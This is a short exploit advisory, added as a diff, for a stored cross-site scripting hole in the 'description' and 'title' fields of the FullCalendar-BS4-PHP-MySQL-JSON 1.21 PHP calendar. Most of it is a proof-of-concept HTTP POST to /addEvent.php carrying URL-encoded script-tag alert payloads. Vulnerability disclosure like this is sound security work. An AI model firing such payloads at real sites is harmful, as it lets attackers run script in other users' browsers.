@@ -1,0 +1,28 @@
+Exploit Title: waldronmatt FullCalendar-BS4-PHP-MySQL-JSON 1.21 - 'description' Cross-Site Scripting
+Date: 2019-10-28
+Exploit Author: Cakes
+Vendor Homepage: waldronmatt/FullCalendar-BS4-PHP-MySQL-JSON
+Software Link: https://github.com/waldronmatt/FullCalendar-BS4-PHP-MySQL-JSON.git
+Version: 1.21
+Tested on: CentOS7
+CVE : N/A
+
+# Description:
+# Cross-Site scripting vulnerability in the description field. This XSS completely breaks the web application.
+
+#POC
+POST /addEvent.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.0.0.20/calendar03/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 213
+Cookie: PHPSESSID=t41kk4huqaluhcfghvqqvucl56
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+title=%3Cscript%3Ealert%28%22TEST-Title%22%29%3B%3C%2Fscript%3E&description=%3Cscript%3Ealert%28%22TEST-Description%22%29%3B%3C%2Fscript%3E&color=%230071c5&start=2019-01-23+00%3A00%3A00&end=2019-01-24+00%3A00%3A00
